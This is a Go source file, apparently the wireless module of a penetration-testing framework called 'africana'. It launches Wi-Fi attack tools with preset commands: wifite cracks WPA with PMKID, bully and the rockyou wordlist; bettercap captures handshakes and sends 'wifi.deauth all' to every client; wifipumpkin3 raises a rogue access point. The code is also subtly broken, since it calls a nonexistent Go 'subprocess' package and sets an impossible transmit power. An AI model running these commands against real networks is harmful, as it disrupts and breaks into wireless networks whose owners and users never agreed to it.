package wireless

import (
    "os"
    "fmt"
    "utils"
    "bufio"
    "bcolors"
    "subprocess"
)

var (
    userInput   string
    userIface   string
    userSsid    string
    scanner = bufio.NewScanner(os.Stdin)
)

func AirGeddon() {
    subprocess.Popen(`airgeddon`)
}

func FluxionMan() {
    subprocess.Popen(`cd /root/.africana/africana-base/wireless/fluxion/; bash fluxion.sh`)
}

func WifiPumpkin3() {
    filePath := "/root/.config/wifipumpkin3/"
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        subprocess.Popen(`wifipumpkin3`)
        utils.ClearScreen()
    }
    subprocess.Popen(`wifipumpkin3`)
}

func WifiteAuto() {
    fmt.Println()
    subprocess.Popen(`ip address`)
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Wireless card " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "wlan0" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🍍" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    scanner.Scan()
    userIface := scanner.Text()
    if userIface == "" {
        userIface = "wlan0"
    }
    subprocess.Popen(`wifite -i %s --ignore-locks --keep-ivs -p 1339 -mac --random-mac -v -inf --bully --pmkid --dic /usr/share/wordlists/rockyou.txt --require-fakeauth --nodeauth --pmkid-timeout 120`, userIface)
}

func BettercapAuto() {
    fmt.Println()
    subprocess.Popen(`ip address`)
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Wireless card " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "wlan0" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🍍" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    scanner.Scan()
    userIface := scanner.Text()
    if userIface == "" {
        userIface = "wlan0"
    }
    subprocess.Popen(`airmon-ng check kill; service NetworkManager restart; ip link set %s down; iw dev %s set type monitor; ip link set %s up; iw %s set txpower fixed 3737373737373; service NetworkManager start; sleep 3; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; wifi.recon on; wifi.show; set wifi.show.sort clients desc; set ticker.commands clear; wifi.show; wifi.assoc all; wifi.assoc all wifi.handshakes.file /usr/local/opt/handshakes; wifi.deauth all"`, userIface, userIface, userIface, userIface, userIface)
}

func WifiPumpkin3Auto() {
    fmt.Println()
    subprocess.Popen(`ip address`)
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Wireless card " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "wlan0" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🍍" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    scanner.Scan()
    userIface := scanner.Text()
    if userIface == "" {
        userIface = "wlan0"
    }
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Wifi name " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Jesus Is The Answer" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🍍" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    scanner.Scan()
    userSsid := scanner.Text()
    if userSsid == "" {
       userSsid = "Jesus Is The Answer"
    }
    filePath := "/root/.config/wifipumpkin3/"
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        subprocess.Popen(`wifipumpkin3; clear`)
    }
    subprocess.Popen(`wifipumpkin3 --xpulp "set interface %s; set ssid '%s'; set proxy noproxy; start"`, userIface, userSsid)
}

